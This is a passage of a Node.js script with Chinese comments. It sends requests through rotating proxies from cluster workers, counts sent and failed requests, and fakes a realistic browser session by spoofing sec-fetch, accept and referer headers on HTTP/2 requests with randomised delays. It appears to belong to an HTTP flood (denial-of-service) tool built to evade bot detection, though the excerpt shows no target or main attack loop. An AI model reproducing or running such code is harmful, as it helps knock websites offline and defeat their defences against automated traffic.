                    
                    
                    sentRequests++;
                }
                
                
                const responseStr = chunk.toString();
                const title = extractPageTitle(responseStr);
                if (title !== "Unknown" && cluster.isWorker) {
                    process.send({ 
                        type: 'status_update', 
                        title: title,
                        worker: cluster.worker.id
                    });
                }
                
                if (debug === 'true') {
                    const jsonDebug = {
                        proxy: proxy[0] + ":" + proxy[1],
                        code: statusCode
                    };
                                log('调试'.yellow + '  ' + JSON.stringify(jsonDebug));
                            }
                        }
                    } catch (err) {
                        if (debug === 'true') {
                            log("错误".red + " HTTP/1.1 响应解析错误: " + err.message);
                        }
                    }
                    
                    // 清理
                    setTimeout(function () {
                        chunk = null;
                        return;
                    }, 10000);
                });
            } catch (err) {
                failedRequests++;
                if (debug === 'true') {
                    log("错误".red + " HTTP/1.1 TLS连接创建失败: " + err.message);
                }
            }
        });
        
        req.on('error', function(err) {
            failedRequests++;
            if (debug === 'true') {
                log("错误".red + " HTTP/1.1 代理请求失败: " + proxy[0] + ":" + proxy[1] + " - " + err.message);
            }
        });

    req.end();
    } catch (err) {
        failedRequests++;
        if (debug === 'true') {
            log("错误".red + " HTTP/1.1 请求总体失败: " + err.message);
        }
    }
}

// 添加真实的浏览器会话数据
function simulateRealBrowserSession(client, h2headers) {
  // 定义典型浏览器资源请求顺序
  const resourceSequence = [
    {type: "document", path: h2headers[':path']},
    {type: "stylesheet", path: "/styles.css"},
    {type: "script", path: "/main.js"},
    {type: "image", path: "/logo.png"},
    {type: "font", path: "/fonts/font.woff2"}
  ];
  
  
  let currentDelay = 0;
  
  resourceSequence.forEach((resource, index) => {
    
    const resourceDelay = index === 0 ? 0 : 
                         (resource.type === "stylesheet" ? 50 + Math.random()*100 : 
                         (resource.type === "script" ? 100 + Math.random()*150 : 
                         (resource.type === "image" ? 200 + Math.random()*300 : 
                          300 + Math.random()*500))); 
    
    currentDelay += resourceDelay;
    
   
    setTimeout(() => {
      if (client.destroyed) return;
      
      const resourceHeaders = {...h2headers};
      resourceHeaders[':path'] = resource.path;
      
      
      if (resource.type === "stylesheet") {
        resourceHeaders['accept'] = 'text/css,*/*;q=0.1';
        resourceHeaders['sec-fetch-dest'] = 'style';
        resourceHeaders['sec-fetch-mode'] = 'no-cors';
      } else if (resource.type === "script") {
        resourceHeaders['accept'] = '*/*';
        resourceHeaders['sec-fetch-dest'] = 'script';
        resourceHeaders['sec-fetch-mode'] = 'no-cors';
      } else if (resource.type === "image") {
        resourceHeaders['accept'] = 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8';
        resourceHeaders['sec-fetch-dest'] = 'image';
        resourceHeaders['sec-fetch-mode'] = 'no-cors';
      } else if (resource.type === "font") {
        resourceHeaders['accept'] = '*/*';
        resourceHeaders['sec-fetch-dest'] = 'font';
        resourceHeaders['sec-fetch-mode'] = 'cors';
        resourceHeaders['origin'] = `https://${h2headers[':authority']}`;
      }
      
     
      if (index > 0) {
        resourceHeaders['referer'] = `https://${h2headers[':authority']}${resourceSequence[0].path}`;
      }
      
      const request = client.request(resourceHeaders);
      request.end();
    }, currentDelay);
  });
}

// 模拟基础网络波动的简单函数
function simulateNetworkJitter() {
  return Math.floor(Math.random() * 200) + 50; 
}
